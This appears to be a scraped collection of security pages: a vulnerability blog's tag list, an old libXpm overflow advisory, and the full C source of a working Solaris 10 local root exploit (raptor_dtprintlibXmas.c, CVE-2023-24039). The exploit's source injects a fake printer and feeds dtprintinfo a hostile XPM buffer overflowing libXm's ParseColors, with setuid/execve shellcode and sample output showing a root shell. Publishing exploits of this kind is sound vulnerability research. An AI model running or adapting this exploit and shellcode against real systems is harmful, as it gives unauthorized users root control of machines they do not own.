[authentication](https://security.humanativaspa.it/tag/authentication/%20)
[azure rtos](https://security.humanativaspa.it/tag/azure-rtos/%20)
[bindiff](https://security.humanativaspa.it/tag/bindiff/%20)
[brida](https://security.humanativaspa.it/tag/brida/%20)
[Burp Suite](https://security.humanativaspa.it/tag/burp-suite/%20)
[Bus Pirate](https://security.humanativaspa.it/tag/bus-pirate/%20)
[business](https://security.humanativaspa.it/tag/business/%20)
[BUSSide](https://security.humanativaspa.it/tag/busside/%20)
[c/c++](https://security.humanativaspa.it/tag/c-c/%20)
[c2](https://security.humanativaspa.it/tag/c2/%20)
[code review](https://security.humanativaspa.it/tag/code-review/%20)
[cracking](https://security.humanativaspa.it/tag/cracking/%20)
[cve-2021-22205](https://security.humanativaspa.it/tag/cve-2021-22205/%20)
[CVE-2022-0342](https://security.humanativaspa.it/tag/cve-2022-0342/%20)
[CVE-2022-2030](https://security.humanativaspa.it/tag/cve-2022-2030/%20)
[cve-2022-26531](https://security.humanativaspa.it/tag/cve-2022-26531/%20)
[cve-2022-26532](https://security.humanativaspa.it/tag/cve-2022-26532/%20)
[cve-2022-46285](https://security.humanativaspa.it/tag/cve-2022-46285/%20)
[cve-2023-24039](https://security.humanativaspa.it/tag/cve-2023-24039/%20)
[cve-2023-24040](https://security.humanativaspa.it/tag/cve-2023-24040/%20)
[DevSecCon](https://security.humanativaspa.it/tag/devseccon/%20)
[disassembly](https://security.humanativaspa.it/tag/disassembly/%20)
[dll](https://security.humanativaspa.it/tag/dll/%20)
[dynamic analysis](https://security.humanativaspa.it/tag/dynamic-analysis/%20)
[EL](https://security.humanativaspa.it/tag/el/%20)
[EL Injection](https://security.humanativaspa.it/tag/el-injection/%20)
[exploit](https://security.humanativaspa.it/tag/exploit/%20)
[exploit development](https://security.humanativaspa.it/tag/exploit-development/%20)
[Extender](https://security.humanativaspa.it/tag/extender/%20)
[Extender course](https://security.humanativaspa.it/tag/extender-course/%20)
[Extending Burp Suite](https://security.humanativaspa.it/tag/extending-burp-suite/%20)
[fault injection](https://security.humanativaspa.it/tag/fault-injection/%20)
[firmware](https://security.humanativaspa.it/tag/firmware/%20)
[foreverday](https://security.humanativaspa.it/tag/foreverday/%20)
[format string](https://security.humanativaspa.it/tag/format-string/%20)
[frida](https://security.humanativaspa.it/tag/frida/%20)
[ghidra](https://security.humanativaspa.it/tag/ghidra/%20)
[ghidra2frida](https://security.humanativaspa.it/tag/ghidra2frida/%20)
[gitlab](https://security.humanativaspa.it/tag/gitlab/%20)
[golang](https://security.humanativaspa.it/tag/golang/%20)
[groovy](https://security.humanativaspa.it/tag/groovy/%20)
[Hack In Paris](https://security.humanativaspa.it/tag/hack-in-paris/%20)
[hacking](https://security.humanativaspa.it/tag/hacking/%20)
[HackRF](https://security.humanativaspa.it/tag/hackrf/%20)
[hardware](https://security.humanativaspa.it/tag/hardware/%20)
[hn security](https://security.humanativaspa.it/tag/hn-security/%20)
[I2C](https://security.humanativaspa.it/tag/i2c/%20)
[ida](https://security.humanativaspa.it/tag/ida/%20)
[incident response](https://security.humanativaspa.it/tag/incident-response/%20)
[infiltrate](https://security.humanativaspa.it/tag/infiltrate/%20)
[Instrumentation](https://security.humanativaspa.it/tag/instrumentation/%20)
[interview](https://security.humanativaspa.it/tag/interview/%20)
[iOS](https://security.humanativaspa.it/tag/ios/%20)
[iot](https://security.humanativaspa.it/tag/iot/%20)
[Java](https://security.humanativaspa.it/tag/java/%20)
[Java Applet](https://security.humanativaspa.it/tag/java-applet/%20)
[Java Deserialization Scanner](https://security.humanativaspa.it/tag/java-deserialization-scanner/%20)
[Java Serialization](https://security.humanativaspa.it/tag/java-serialization/%20)
[Keil](https://security.humanativaspa.it/tag/keil/%20)
[keycloak](https://security.humanativaspa.it/tag/keycloak/%20)
[kotlin](https://security.humanativaspa.it/tag/kotlin/%20)
[log4j](https://security.humanativaspa.it/tag/log4j/%20)
[maven](https://security.humanativaspa.it/tag/maven/%20)
[metasploit](https://security.humanativaspa.it/tag/metasploit/%20)
[meterpreter](https://security.humanativaspa.it/tag/meterpreter/%20)
[mimikatz](https://security.humanativaspa.it/tag/mimikatz/%20)
[minidump](https://security.humanativaspa.it/tag/minidump/%20)
[mips](https://security.humanativaspa.it/tag/mips/%20)
[mobile](https://security.humanativaspa.it/tag/mobile/%20)
[Montoya API](https://security.humanativaspa.it/tag/montoya-api/%20)
[offensive security](https://security.humanativaspa.it/tag/offensive-security/%20)
[oldschool](https://security.humanativaspa.it/tag/oldschool/%20)
[open source](https://security.humanativaspa.it/tag/open-source/%20)
[OpenSSH](https://security.humanativaspa.it/tag/openssh/%20)
[passwords](https://security.humanativaspa.it/tag/passwords/%20)
[penetration test](https://security.humanativaspa.it/tag/penetration-test/%20)
[pentest](https://security.humanativaspa.it/tag/pentest/%20)
[php](https://security.humanativaspa.it/tag/php/%20)
[Phrack](https://security.humanativaspa.it/tag/phrack/%20)
[podcast](https://security.humanativaspa.it/tag/podcast/%20)
[pom.xml](https://security.humanativaspa.it/tag/pom-xml/%20)
[protobuf](https://security.humanativaspa.it/tag/protobuf/%20)
[pseudocode](https://security.humanativaspa.it/tag/pseudocode/%20)
[radio](https://security.humanativaspa.it/tag/radio/%20)
[ransomware](https://security.humanativaspa.it/tag/ransomware/%20)
[RCE](https://security.humanativaspa.it/tag/rce/%20)
[red teaming](https://security.humanativaspa.it/tag/red-teaming/%20)
[research](https://security.humanativaspa.it/tag/research/%20)
[reverse engineering](https://security.humanativaspa.it/tag/reverse-engineering/%20)
[riot](https://security.humanativaspa.it/tag/riot/%20)
[romhack](https://security.humanativaspa.it/tag/romhack/%20)
[rt-thread](https://security.humanativaspa.it/tag/rt-thread/%20)
[rust](https://security.humanativaspa.it/tag/rust/%20)
[saleae](https://security.humanativaspa.it/tag/saleae/%20)
[Security Manager](https://security.humanativaspa.it/tag/security-manager/%20)
[seemposium](https://security.humanativaspa.it/tag/seemposium/%20)
[semgrep](https://security.humanativaspa.it/tag/semgrep/%20)
[Serialization](https://security.humanativaspa.it/tag/serialization/%20)
[shellcode](https://security.humanativaspa.it/tag/shellcode/%20)
[single sign-on](https://security.humanativaspa.it/tag/single-sign-on/%20)
[sliver](https://security.humanativaspa.it/tag/sliver/%20)
[solaris](https://security.humanativaspa.it/tag/solaris/%20)
[source code analysis](https://security.humanativaspa.it/tag/source-code-analysis/%20)
[sparc](https://security.humanativaspa.it/tag/sparc/%20)
[static analysis](https://security.humanativaspa.it/tag/static-analysis/%20)
[statistics](https://security.humanativaspa.it/tag/statistics/%20)
[tactical exploitation](https://security.humanativaspa.it/tag/tactical-exploitation/%20)
[Template Injection](https://security.humanativaspa.it/tag/template-injection/%20)
[threadx](https://security.humanativaspa.it/tag/threadx/%20)
[threat intelligence](https://security.humanativaspa.it/tag/threat-intelligence/%20)
[Tutorial](https://security.humanativaspa.it/tag/tutorial/%20)
[UART](https://security.humanativaspa.it/tag/uart/%20)
[Universal Radio Hacker](https://security.humanativaspa.it/tag/universal-radio-hacker/%20)
[vulnerability research](https://security.humanativaspa.it/tag/vulnerability-research/%20)
[web](https://security.humanativaspa.it/tag/web/%20)
[weggli](https://security.humanativaspa.it/tag/weggli/%20)
[whitebox](https://security.humanativaspa.it/tag/whitebox/%20)
[windows](https://security.humanativaspa.it/tag/windows/%20)
[x86](https://security.humanativaspa.it/tag/x86/%20)
[xamarin](https://security.humanativaspa.it/tag/xamarin/%20)
[yii](https://security.humanativaspa.it/tag/yii/%20)
[ysoserial](https://security.humanativaspa.it/tag/ysoserial/%20)
[zephyr](https://security.humanativaspa.it/tag/zephyr/%20)
[zyxel](https://security.humanativaspa.it/tag/zyxel/%20)

## Post navigation

[Previous: A journey into IoT – Unknown Chinese alarm – Part 4 – Internal communications](https://security.humanativaspa.it/a-journey-into-iot-unknown-chinese-alarm-part-4-internal-communications/)[Next: Abusing Maven’s pom.xml](https://security.humanativaspa.it/abusing-mavens-pom-xml/)

###### Legal and Administrative

Viale Oceano Pacifico, 66

00144 Rome (Italy)

###### [www.humanativaspa.it](https://humanativaspa.it)

Copyright © 2021-2025 HN Security S.r.l.

[Privacy Policy](https://humanativaspa.it/en/privacy-policy/)

We use cookies on our website to give you the most relevant experience by remembering your preferences and repeat visits. By clicking “Accept”, you consent to the use of ALL the cookies.Cookie settingsACCEPTManage consent

Close

#### Privacy Overview

This website uses cookies to improve your experience while you navigate through the website. Out of these, the cookies that are categorized as necessary are stored on your browser as they are essential for the working of basic functionalities of the website. We also use third-party cookies that help us analyze and understand how you use this website. These cookies will be stored in your browser only with your consent. You also have the option to opt-out of these cookies. But opting out of some of these cookies may affect your browsing experience.

Necessary

Necessary

Always Enabled

Necessary cookies are absolutely essential for the website to function properly. These cookies ensure basic functionalities and security features of the website, anonymously.

| Cookie | Duration | Description |
| --- | --- | --- |
| cookielawinfo-checbox-analytics | 11 months | This cookie is set by GDPR Cookie Consent plugin. The cookie is used to store the user consent for the cookies in the category "Analytics". |
| cookielawinfo-checbox-functional | 11 months | The cookie is set by GDPR cookie consent to record the user consent for the cookies in the category "Functional". |
| cookielawinfo-checbox-others | 11 months | This cookie is set by GDPR Cookie Consent plugin. The cookie is used to store the user consent for the cookies in the category "Other. |
| cookielawinfo-checkbox-necessary | 11 months | This cookie is set by GDPR Cookie Consent plugin. The cookies is used to store the user consent for the cookies in the category "Necessary". |
| cookielawinfo-checkbox-performance | 11 months | This cookie is set by GDPR Cookie Consent plugin. The cookie is used to store the user consent for the cookies in the category "Performance". |
| viewed\_cookie\_policy | 11 months | The cookie is set by the GDPR Cookie Consent plugin and is used to store whether or not user has consented to the use of cookies. It does not store any personal data. |

Functional

Functional

Functional cookies help to perform certain functionalities like sharing the content of the website on social media platforms, collect feedbacks, and other third-party features.

Performance

Performance

Performance cookies are used to understand and analyze the key performance indexes of the website which helps in delivering a better user experience for the visitors.

Analytics

Analytics

Analytical cookies are used to understand how visitors interact with the website. These cookies help provide information on metrics the number of visitors, bounce rate, traffic source, etc.

Advertisement

Advertisement

Advertisement cookies are used to provide visitors with relevant ads and marketing campaigns. These cookies track visitors across websites and collect information to provide customized ads.

Others

Others

Other uncategorized cookies are those that are being analyzed and have not been classified into a category as yet.

SAVE & ACCEPT



=== Content from github.com_2e6e7c29_20250115_113943.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fhnsecurity%2Fvulns%2Fblob%2Fmain%2FHNS-2022-01-dtprintinfo.txt)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fhnsecurity%2Fvulns%2Fblob%2Fmain%2FHNS-2022-01-dtprintinfo.txt)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fblob%2Fshow&source=header-repo&source_repo=hnsecurity%2Fvulns)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[hnsecurity](/hnsecurity)
/
**[vulns](/hnsecurity/vulns)**
Public

* [Notifications](/login?return_to=%2Fhnsecurity%2Fvulns) You must be signed in to change notification settings
* [Fork
  2](/login?return_to=%2Fhnsecurity%2Fvulns)
* [Star
   21](/login?return_to=%2Fhnsecurity%2Fvulns)

* [Code](/hnsecurity/vulns)
* [Issues
  0](/hnsecurity/vulns/issues)
* [Pull requests
  0](/hnsecurity/vulns/pulls)
* [Actions](/hnsecurity/vulns/actions)
* [Projects
  0](/hnsecurity/vulns/projects)
* [Security](/hnsecurity/vulns/security)
* [Insights](/hnsecurity/vulns/pulse)

Additional navigation options

* [Code](/hnsecurity/vulns)
* [Issues](/hnsecurity/vulns/issues)
* [Pull requests](/hnsecurity/vulns/pulls)
* [Actions](/hnsecurity/vulns/actions)
* [Projects](/hnsecurity/vulns/projects)
* [Security](/hnsecurity/vulns/security)
* [Insights](/hnsecurity/vulns/pulse)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from security.appspot.com_e6316963_20250115_113941.html ===
CESA-2004-003 - rev 4
http://scary.beasts.org/security/CESA-2004-003.txt
[See all my vulnerabilities at http://scary.beasts.org/security]
libXpm multiple image parsing flaws
===================================
Programs affected: libXpm, and any programs which use libXpm to decode XPM
files. For example, the GIMP seems to use libXpm.
Severity: Compromise of account used to browse malicious XPM file.
CAN identifier(s): CAN-2004-0687 and CAN-2004-0688
Fixed: X.ORG release 6.8.1 contains fixes.
This advisory lists code flaws discovered by inspection of the libXpm code.
The specific version of libXpm discussed is the release that comes with the
initial X.ORG X11 system source code release. However, these flaws seem to
exist in older versions.
Flaw 1. Stack-based overflow in xpmParseColors (parse.c).
This is CAN-2004-0687
Careless use of strcat() in both the XPMv1 and XPMv2/3 parsing code leads to
a stack based overflow that should be exploitable. There are minor
complications due to stack layout; the buffer being overflowed in fact
typically overflows into another buffer that is used to populate the overflowed
buffer. This should not prevent exploitation, however.
Demo XPM: http://scary.beasts.org/misc/doom.xpm
Flaw 2. Integer overflow allocating colorTable in xpmParseColors (parse.c) -
probably a crashable but not exploitable offence. Here:
This is CAN-2004-0688
colorTable = (XpmColor \*) XpmCalloc(ncolors, sizeof(XpmColor));
ncolors would seem to come from the (untrusted) XPM file.
In fact, multiple integer overflow problems seem to exist. Some may well be
exploitable. Note that the following may not be an exhaustive list:
a) XpmCreateImageFromXpmImage: multiple possible overflow, e.g.:
image\_pixels = (Pixel \*) XpmMalloc(sizeof(Pixel) \* image->ncolors);
(ncolors is user-supplied)
b) CreateXImage:
\*image\_return = XCreateImage(display, visual, depth, format, 0, 0,
width, height, bitmap\_pad, 0);
(width and height are user-supplied, possibly other variables too)
c) ParsePixels:
iptr2 = (unsigned int \*) XpmMalloc(sizeof(unsigned int) \* width \* height);
(width and height are user-supplied)
d) ParseAndPutPixels and ParsePixels:
cidx[char1][(unsigned char)colorTable[a].string[1]] = a + 1;
(possibly, char1 might be negative, and access the cidx array out of bounds)
Flaw 3. Stack overflow reading pixel values in ParseAndPutPixels (create.c) as
well as ParsePixels (parse.c). Should be exploitable.
This is CAN-2004-0687
A user-supplied number of bytes are stuffed into a fixed-size buffer (typically
8192 bytes). The user gets to choose how many bytes to put into this buffer
via the "number of bytes per pixel" XPM value.
Demo XPM: http://scary.beasts.org/misc/doom2.xpm
CESA-2004-003 - rev 4
Chris Evans
chris@scary.beasts.org


=== Content from github.com_79597a84_20250115_113939.html ===
/\*
\* raptor\_dtprintlibXmas.c - Solaris 10 CDE #ForeverDay LPE
\* Copyright (c) 2023 Marco Ivaldi
\*
\* "What has been will be again,
\* what has been done will be done again;
\* there is nothing new under the Sun."
\* -- Ecclesiastes 1:9
\*
\* "A stack-based buffer overflow in ParseColors in libXm in Common Desktop
\* Environment 1.6 can be exploited by local low-privileged users via the
\* dtprintinfo setuid binary to escalate their privileges to root on Solaris
\* 10 systems. NOTE: This vulnerability only affects products that are no
\* longer supported by the maintainer." (CVE-2023-24039)
\*
\* #Solaris #CDE #0day #ForeverDay #WontFix
\*
\* This exploit illustrates yet another way to abuse the infamous dtprintinfo
\* binary distributed with the Common Desktop Environment (CDE), a veritable
\* treasure trove for bug hunters since the 1990s. It's not the most reliable
\* exploit I've ever written, but I'm quite proud of the new vulnerabilities
\* I've unearthed in dtprintinfo with the latest Solaris patches (CPU January
\* 2021) applied. The exploit chain is structured as follows:
\* 1. Inject a fake printer via the printer injection bug I found in lpstat.
\* 2. Exploit the stack-based buffer overflow I found in libXm ParseColors().
\* 3. Enjoy root privileges!
\*
\* For additional details on my bug hunting journey and on the vulnerabilities
\* themselves, you can refer to the official advisory:
\* https://github.com/0xdea/advisories/blob/master/HNS-2022-01-dtprintinfo.txt
\*
\* Usage:
\* $ gcc raptor\_dtprintlibXmas.c -o raptor\_dtprintlibXmas -Wall
\* $ ./raptor\_dtprintlibXmas 10.0.0.109:0
\* raptor\_dtprintlibXmas.c - Solaris 10 CDE #ForeverDay LPE
\* Copyright (c) 2023 Marco Ivaldi
\*
\* Using SI\_PLATFORM : i86pc (5.10)
\* Using stack base : 0x8047fff
\* Using safe address : 0x8045790
\* Using rwx\_mem address : 0xfeffa004
\* Using sc address : 0x8047fb4
\* Using sprintf() address : 0xfefd1250
\* Path of target binary : /usr/dt/bin/dtprintinfo
\*
\* On your X11 server:
\* 1. Select the "fnord" printer, then click on "Selected" > "Properties".
\* 2. Click on "Find Set" and choose "/tmp/.dt/icons" from the drop-down menu.
\*
\* Back to your original shell:
\* # id
\* uid=0(root) gid=1(other)
\*
\* IMPORTANT NOTE.
\* The buffer overflow corrupts some critical variables in memory, which we
\* need to fix. In order to do so, we must patch the hostile buffer at some
\* fixed locations with the first argument of the last call to ParseColors().
\* The easiest way to get such a safe address is via the special 0x41414141
\* command-line argument and truss, as follows:
\* $ truss -fae -u libXm:: ./raptor\_dtprintlibXmas 10.0.0.109:0 0x41414141 2>OUT
\* $ grep ParseColors OUT | tail -1
\* 29181/1@1: -> libXm:ParseColors(0x8045770, 0x3, 0x1, 0x8045724)
\* ^^^^^^^^^ << this is the safe address we need
\*
\* Tested on:
\* SunOS 5.10 Generic\_153154-01 i86pc i386 i86pc (CPU January 2021)
\* [previous Solaris versions are also likely vulnerable]
\*/
#include
#include
#include
#include
#include
#include
#include
#include
#include
#define INFO1 "raptor\_dtprintlibXmas.c - Solaris 10 CDE #ForeverDay LPE"
#define INFO2 "Copyright (c) 2023 Marco Ivaldi "
#define VULN "/usr/dt/bin/dtprintinfo" // vulnerable program
#define DEBUG "/tmp/XXXXXXXXXXXXXXXXXX" // target for debugging
#define BUFSIZE 1106 // size of hostile buffer
#define PADDING 1 // hostile buffer padding
#define SAFE 0x08045770 // 1st arg to ParseColors()
char sc[] = /\* Solaris/x86 shellcode (8 + 8 + 8 + 27 = 51 bytes) \*/
/\* triple setuid() \*/
"\x31\xc0\x50\x50\xb0\x17\xcd\x91"
"\x31\xc0\x50\x50\xb0\x17\xcd\x91"
"\x31\xc0\x50\x50\xb0\x17\xcd\x91"
/\* execve() \*/
"\x31\xc0\x50\x68/ksh\x68/bin"
"\x89\xe3\x50\x53\x89\xe2\x50"
"\x52\x53\xb0\x3b\x50\xcd\x91";
/\* globals \*/
char \*arg[2] = {"foo", NULL};
char \*env[256];
int env\_pos = 0, env\_len = 0;
/\* prototypes \*/
int add\_env(char \*string);
void check\_bad(int addr, char \*name);
int get\_env\_addr(char \*path, char \*\*argv);
int search\_ldso(char \*sym);
int search\_rwx\_mem(void);
void set\_val(char \*buf, int pos, int val);
/\*
\* main()
\*/
int main(int argc, char \*\*argv)
{
char buf[BUFSIZE], cmd[1024], \*vuln = VULN;
char platform[256], release[256], display[256];
int i, sc\_addr, safe\_addr = SAFE;
FILE \*fp;
int sb = ((int)argv[0] | 0xfff); // stack base
int ret = search\_ldso("sprintf"); // sprintf() in ld.so.1
int rwx\_mem = search\_rwx\_mem(); // rwx memory
/\* helper that prints argv[0] address, used by get\_env\_addr() \*/
if (!strcmp(argv[0], arg[0])) {
printf("0x%p\n", argv[0]);
exit(0);
}
/\* print exploit information \*/
fprintf(stderr, "%s\n%s\n\n", INFO1, INFO2);
/\* process command line \*/
if ((argc < 2) || (argc > 3)) {
fprintf(stderr, "usage: %s xserver:display [safe\_addr]\n\n",
argv[0]);
exit(1);
}
snprintf(display, sizeof(display), "DISPLAY=%s", argv[1]);
if (argc > 2) {
safe\_addr = (int)strtoul(argv[2], (char \*\*)NULL, 0);
}
/\* enter debug mode \*/
if (safe\_addr == 0x41414141) {
unlink(DEBUG);
snprintf(cmd, sizeof(cmd), "cp %s %s", VULN, DEBUG);
if (system(cmd) == -1) {
perror("error creating debug binary");
exit(1);
}
vuln = DEBUG;
}
/\* fill envp while keeping padding \*/
add\_env("LPDEST=fnord"); // injected printer
add\_env("HOME=/tmp"); // home directory
add\_env("PATH=/usr/bin:/bin"); // path
sc\_addr = add\_env(display); // x11 display
add\_env(sc); // shellcode
add\_env(NULL);
/\* calculate shellcode address \*/
sc\_addr += get\_env\_addr(vuln, argv);
/\* inject a fake printer \*/
unlink("/tmp/.printers");
unlink("/tmp/.printers.new");
if (!(fp = fopen("/tmp/.printers", "w"))) {
perror("error injecting a fake printer");
exit(1);
}
fprintf(fp, "fnord :\n");
fclose(fp);
link("/tmp/.printers", "/tmp/.printers.new");
/\* craft the hostile buffer \*/
bzero(buf, sizeof(buf));
for (i = PADDING; i < BUFSIZE - 16; i += 4) {
set\_val(buf, i, ret); // sprintf()
set\_val(buf, i += 4, rwx\_mem); // saved eip
set\_val(buf, i += 4, rwx\_mem); // 1st arg
set\_val(buf, i += 4, sc\_addr); // 2nd arg
}
memcpy(buf, "\"c c ", 5); // beginning of hostile buffer
buf[912] = ' '; // string separator
set\_val(buf, 1037, safe\_addr); // safe address
set\_val(buf, 1065, safe\_addr); // safe address
set\_val(buf, 1073, 0xffffffff); // -1
/\* create the hostile XPM icon files \*/
system("rm -fr /tmp/.dt");
mkdir("/tmp/.dt", 0755);
mkdir("/tmp/.dt/icons", 0755);
if (!(fp = fopen("/tmp/.dt/icons/fnord.m.pm", "w"))) {
perror("error creating XPM icon files");
exit(1);
}
fprintf(fp, "/\* XPM \*/\nstatic char \*xpm[] = {\n\"8 8 3 1\",\n%s", buf);
fclose(fp);
link("/tmp/.dt/icons/fnord.m.pm", "/tmp/.dt/icons/fnord.l.pm");
link("/tmp/.dt/icons/fnord.m.pm", "/tmp/.dt/icons/fnord.t.pm");
/\* print some output \*/
sysinfo(SI\_PLATFORM, platform, sizeof(platform) - 1);
sysinfo(SI\_RELEASE, release, sizeof(release) - 1);
fprintf(stderr, "Using SI\_PLATFORM\t: %s (%s)\n", platform, release);
fprintf(stderr, "Using stack base\t: 0x%p\n", (void \*)sb);
fprintf(stderr, "Using safe address\t: 0x%p\n", (void \*)safe\_addr);
fprintf(stderr, "Using rwx\_mem address\t: 0x%p\n", (void \*)rwx\_mem);
fprintf(stderr, "Using sc address\t: 0x%p\n", (void \*)sc\_addr);
fprintf(stderr, "Using sprintf() address\t: 0x%p\n", (void \*)ret);
fprintf(stderr, "Path of target binary\t: %s\n\n", vuln);
/\* check for badchars \*/
check\_bad(safe\_addr, "safe address");
check\_bad(rwx\_mem, "rwx\_mem address");
check\_bad(sc\_addr, "sc address");
check\_bad(ret, "sprintf() address");
/\* run the vulnerable program \*/
execve(vuln, arg, env);
perror("execve");
exit(0);
}
/\*
\* add\_env(): add a variable to envp and pad if needed
\*/
int add\_env(char \*string)
{
int i;
/\* null termination \*/
if (!string) {
env[env\_pos] = NULL;
return env\_len;
}
/\* add the variable to envp \*/
env[env\_pos] = string;
env\_len += strlen(string) + 1;
env\_pos++;
/\* pad envp using zeroes \*/
if ((strlen(string) + 1) % 4)
for (i = 0; i < (4 - ((strlen(string)+1)%4)); i++, env\_pos++) {
env[env\_pos] = string + strlen(string);
env\_len++;
}
return env\_len;
}
/\*
\* check\_bad(): check an address for the presence of badchars
\*/
void check\_bad(int addr, char \*name)
{
int i, bad[] = {0x00, 0x09, 0x20}; // NUL, HT, SP
for (i = 0; i < sizeof(bad) / sizeof(int); i++) {
if (((addr & 0xff) == bad[i]) ||
((addr & 0xff00) == bad[i]) ||
((addr & 0xff0000) == bad[i]) ||
((addr & 0xff000000) == bad[i])) {
fprintf(stderr, "error: %s contains a badchar\n", name);
exit(1);
}
}
}
/\*
\* get\_env\_addr(): get environment address using a helper program
\*/
int get\_env\_addr(char \*path, char \*\*argv)
{
char prog[] = "./AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
char hex[11];
int fd[2], addr;
/\* truncate program name at correct length and create a hard link \*/
prog[strlen(path)] = '\0';
unlink(prog);
link(argv[0], prog);
/\* open pipe to read program output \*/
if (pipe(fd) == -1) {
perror("pipe");
exit(1);
}
switch(fork()) {
case -1: /\* cannot fork \*/
perror("fork");
exit(1);
case 0: /\* child \*/
dup2(fd[1], 1);
close(fd[0]);
close(fd[1]);
execve(prog, arg, env);
perror("execve");
exit(1);
default: /\* parent \*/
close(fd[1]);
read(fd[0], hex, sizeof(hex));
break;
}
/\* check address \*/
if (!(addr = (int)strtoul(hex, (char \*\*)NULL, 0))) {
fprintf(stderr, "error: cannot read address from helper\n");
exit(1);
}
return addr + strlen(arg[0]) + 1;
}
/\*
\* search\_ldso(): search for a symbol inside ld.so.1
\*/
int search\_ldso(char \*sym)
{
int addr;
void \*handle;
Link\_map \*lm;
/\* open the executable object file \*/
if ((handle = dlmopen(LM\_ID\_LDSO, NULL, RTLD\_LAZY)) == NULL) {
perror("dlopen");
exit(1);
}
/\* get dynamic load information \*/
if ((dlinfo(handle, RTLD\_DI\_LINKMAP, &lm)) == -1) {
perror("dlinfo");
exit(1);
}
/\* search for the address of the symbol \*/
if ((addr = (int)dlsym(handle, sym)) == NULL) {
fprintf(stderr, "sorry, function %s() not found\n", sym);
exit(1);
}
/\* close the executable object file \*/
dlclose(handle);
return addr;
}
/\*
\* search\_rwx\_mem(): search for an RWX memory segment valid for all
\* programs (typically, /usr/lib/ld.so.1) using the proc filesystem
\*/
int search\_rwx\_mem(void)
{
int fd;
char tmp[16];
prmap\_t map;
int addr = 0, addr\_old;
/\* open the proc filesystem \*/
sprintf(tmp,"/proc/%d/map", (int)getpid());
if ((fd = open(tmp, O\_RDONLY)) < 0) {
fprintf(stderr, "can't open %s\n", tmp);
exit(1);
}
/\* search for the last RWX memory segment before stack (last - 1) \*/
while (read(fd, ↦, sizeof(map)))
if (map.pr\_vaddr)
if (map.pr\_mflags & (MA\_READ | MA\_WRITE | MA\_EXEC)) {
addr\_old = addr;
addr = map.pr\_vaddr;
}
close(fd);
/\* add 4 to the exact address NUL bytes \*/
if (!(addr\_old & 0xff))
addr\_old |= 0x04;
if (!(addr\_old & 0xff00))
addr\_old |= 0x0400;
return addr\_old;
}
/\*
\* set\_val(): copy a dword inside a buffer (little endian)
\*/
void set\_val(char \*buf, int pos, int val)
{
buf[pos] = (val & 0x000000ff);
buf[pos + 1] = (val & 0x0000ff00) >> 8;
buf[pos + 2] = (val & 0x00ff0000) >> 16;
buf[pos + 3] = (val & 0xff000000) >> 24;
}


=== Content from github.com_2e6e7c29_20250114_191031.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fhnsecurity%2Fvulns%2Fblob%2Fmain%2FHNS-2022-01-dtprintinfo.txt)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
